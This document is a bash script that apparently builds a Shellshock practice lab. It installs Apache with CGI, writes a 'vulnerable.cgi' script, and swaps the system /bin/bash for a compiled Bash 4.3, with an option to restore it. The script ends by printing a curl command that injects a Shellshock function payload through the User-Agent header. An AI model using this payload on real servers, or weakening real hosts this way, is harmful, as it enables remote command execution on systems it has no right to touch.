#!/bin/bash

# Function to check the previous command
check_command() {
  if [ $? -ne 0 ]; then
    print_message "red" "Error: $1"
    exit 1
  fi
}

# Function to print messages with color
print_message() {
  local color=$1
  local message=$2

  if [ "$color" == "green" ]; then
    echo -e "\n\e[32m[*] $message\e[0m"
  elif [ "$color" == "red" ]; then
    echo -e "\n\e[31m[!] $message\e[0m"
  elif [ "$color" == "yellow" ]; then
    echo -e "\e[33m[!] $message\e[0m"
  else
    echo -e "\n$message"
  fi
}

# Function to remove the specific line from ~/.bashrc
remove_export_line() {
  local bashrc="/home/simone/.bashrc"
  
  # Check if the last line is 'export PATH=/bin:$PATH' and remove it if true
  last_line=$(tail -n 1 "$bashrc")
  
  if [ "$last_line" == "export PATH=/bin:\$PATH" ]; then
    print_message "green" "Removing the last line 'export PATH=/bin:$PATH' from .bashrc"
    # Remove the last line
    sed -i '$d' "$bashrc"
    check_command "Failed to remove the last line from .bashrc"
  else
    print_message "green" "No matching line found in .bashrc"
  fi
}

# Function to restore the original Bash
restore_bash() {
  # Check if the backup exists
  if [ -f "/bin/bash.backup" ]; then
    # Check if the current Bash version is already the backup
    current_bash=$(readlink -f /bin/bash)
    backup_bash=$(readlink -f /bin/bash.backup)
    
    if [ "$current_bash" == "$backup_bash" ]; then
      print_message "green" "Bash is already restored to the original version"
      check_bash_version
      exit 0
    fi

    # Rename current Bash to bash.vulnerable
    sudo mv /bin/bash /bin/bash.vulnerable
    check_command "Failed to rename current Bash to bash.vulnerable"
    
    # Restore the original Bash
    sudo mv /bin/bash.backup /bin/bash
    check_command "Failed to restore the original Bash"

    sudo apt update
    sudo apt install --reinstall bash
    check_command "Failed to reinstall Bash"
    
    # Set the shell to /bin/bash
    sudo chsh -s /bin/bash
    check_command "Failed to set /bin/bash as the default shell"

    # Add /bin to the PATH permanently
    #echo 'export PATH=/bin:$PATH' >> ~/.bashrc
    #source ~/.bashrc
    check_command "Failed to update the PATH"

    print_message "green" "Bash reinstalled and default shell set successfully."
    print_message "yellow" "Open a new shell to use the original Bash version"
    check_bash_version
  else
    print_message "red" "Backup of the original Bash not found. Attempting to reinstall Bash."
    
    # Attempt to reinstall the system's default Bash version
    sudo apt update
    sudo apt install --reinstall bash
    check_command "Failed to reinstall Bash"
    
    # Set the shell to /bin/bash
    sudo chsh -s /bin/bash
    check_command "Failed to set /bin/bash as the default shell"

    # Add /bin to the PATH permanently
    echo 'export PATH=/bin:$PATH' >> ~/.bashrc
    source ~/.bashrc
    check_command "Failed to update the PATH"

    print_message "green" "Bash reinstalled and default shell set successfully."
    print_message "yellow" "Open a new shell to use the original Bash version"
    check_bash_version
  fi
  exit 0
}

# Function to install Apache
install_apache() {
  print_message "green" "Installing Apache2"
  sudo apt install -y apache2
  check_command "Failed to install Apache2"
}

# Function to enable Apache CGI module
enable_cgi_module() {
  print_message "green" "Enabling Apache CGI module"
  sudo a2enmod cgi
  sudo systemctl restart apache2
  check_command "Failed to enable CGI module"
}

# Function to configure Apache for CGI
configure_apache_cgi() {
  print_message "green" "Configuring Apache for CGI"
  CGI_CONF="/etc/apache2/sites-enabled/000-default.conf"
  # if grep doesn't find "ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/" => append the following lines to $CGI_CONF
  if ! grep -q "ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/" $CGI_CONF; then
    sudo bash -c "cat >> $CGI_CONF" <<EOF

<Directory "/usr/lib/cgi-bin">
    Options +ExecCGI
    AddHandler cgi-script .cgi
    AllowOverride None
    Require all granted
</Directory>

EOF
  fi
  sudo systemctl restart apache2
  check_command "Failed to configure Apache for CGI"
}

# Function to create a vulnerable CGI script
create_vulnerable_cgi_script() {
  print_message "green" "Creating a vulnerable CGI script"
  VULNERABLE_SCRIPT="/usr/lib/cgi-bin/vulnerable.cgi"
  sudo bash -c "cat > $VULNERABLE_SCRIPT" <<'EOF'
#!/bin/bash
echo "Content-type: text/html"
echo ""
echo "<html><body>"
echo "<h1>Executed command: $QUERY_STRING</h1>"
echo "</body></html>"
EOF
  sudo chmod +x $VULNERABLE_SCRIPT
  check_command "Failed to create vulnerable CGI script"
}

# Function to install vulnerable Bash 4.3
install_vulnerable_bash() {
  if [ ! -f "/usr/local/bin/bash" ]; then
    print_message "green" "Installing Bash 4.3 (vulnerable version)"

    # Backup the current Bash version before proceeding
    if [ -f "/bin/bash" ]; then
      sudo mv /bin/bash /bin/bash.backup
      check_command "Failed to backup current Bash version"
      print_message "green" "Current Bash version backed up as /bin/bash.backup"
    else
      print_message "red" "No Bash found at /bin/bash, skipping backup"
      exit 1
    fi

    # Install the necessary packages to compile Bash
    sudo apt update
    sudo apt install -y build-essential wget
    check_command "Failed to install build-essential or wget"

    # Download and compile Bash 4.3
    cd /tmp
    wget http://ftp.gnu.org/gnu/bash/bash-4.3.tar.gz
    check_command "Failed to download Bash 4.3 source"

    tar -xzvf bash-4.3.tar.gz
    cd bash-4.3
    ./configure
    check_command "Failed to configure Bash 4.3"

    make
    check_command "Failed to compile Bash 4.3"

    sudo make install
    check_command "Failed to install Bash 4.3"

    # Replace the current Bash with the vulnerable version
    sudo cp /usr/local/bin/bash /bin/bash
    sudo chmod +x /bin/bash
    check_command "Failed to replace current Bash with vulnerable version"

    # Set the shell to /usr/local/bin/bash (vulnerable version)
    sudo chsh -s /usr/local/bin/bash
    check_command "Failed to set /usr/local/bin/bash as the default shell"

    print_message "green" "Bash 4.3 installed and set as default"
    print_message "yellow" "Open a new shell to use the vulnerable Bash version"
  else
    print_message "green" "Vulnerable Bash version (4.3) is already installed"
    print_message "yellow" "Open a new shell to use the vulnerable Bash version"
  fi
}

# Function to check the version of Bash
check_bash_version() {
  print_message "green" "Checking the version of Bash"
  BASH_VERSION=$(bash --version | head -n 1)
  echo "bash version: $BASH_VERSION"
}

# Function to suggest the exploit test command
suggest_exploit_test() {
  print_message "green" "Test the exploit with the following command:"
  echo "curl -H \"User-Agent: () { :; }; /bin/bash -c 'echo Vulnerable'\" http://localhost/cgi-bin/vulnerable.cgi?query=test"
}

# Main script execution logic

if [ "$1" == "--restore" ]; then
  restore_bash
else
  remove_export_line
  # Install Apache and configure it
  install_apache
  enable_cgi_module
  configure_apache_cgi
  create_vulnerable_cgi_script

  # Install the vulnerable Bash version
  install_vulnerable_bash
  check_bash_version
  suggest_exploit_test
fi
